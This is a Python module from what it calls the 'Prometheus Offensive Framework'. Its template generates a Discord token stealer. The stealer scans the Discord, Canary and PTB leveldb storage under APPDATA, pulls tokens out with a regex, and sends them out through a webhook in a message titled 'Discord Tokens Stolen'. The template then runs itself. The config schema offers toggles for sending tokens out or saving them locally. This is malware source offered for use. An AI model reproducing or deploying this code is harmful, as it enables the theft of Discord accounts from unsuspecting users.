from typing import Dict, Any
from modules.base import Module


class DiscordModule(Module):
    """Discord token stealer module."""

    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.name = "Discord Token Stealer"
        self.id = "discord_tokens"
        self.category = "stealer"
        self.description = "Extracts Discord tokens from local storage."

    def get_template(self) -> str:
        return """
# --- Discord Token Stealer Module ---
def steal_discord_tokens():
    \"\"\"Extract Discord tokens from local storage.\"\"\"
    import os
    import re
    import json
    import base64
    import requests
    from win32crypt import CryptUnprotectData
    from Cryptodome.Cipher import AES
    
    tokens = []
    paths = [
        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
    ]
    
    for path in paths:
        if not os.path.exists(path):
            continue
        try:
            for file in os.listdir(path):
                if file.endswith('.log') or file.endswith('.ldb'):
                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
                        content = f.read()
                        # Find tokens
                        matches = re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', content)
                        for token in matches:
                            tokens.append(token)
        except:
            pass
    
    # Send tokens via webhook
    if tokens:
        data = {
            "embeds": [{
                "title": "🎫 Discord Tokens Stolen",
                "description": f"Found {len(tokens)} tokens",
                "fields": [{
                    "name": "Tokens",
                    "value": "\\n".join(tokens[:10]) + ("..." if len(tokens) > 10 else ""),
                    "inline": False
                }],
                "color": 0x5865F2,
                "footer": {"text": "Prometheus Offensive Framework"}
            }]
        }
        send_webhook(data)
    
    return tokens

# Execute the module
steal_discord_tokens()
"""

    def get_config_schema(self) -> Dict[str, Any]:
        return {
            "enabled": {"type": "boolean", "default": False, "label": "Enable Discord Token Stealing"},
            "send_webhook": {"type": "boolean", "default": True, "label": "Send tokens via webhook"},
            "save_local": {"type": "boolean", "default": False, "label": "Save tokens locally"},
        }
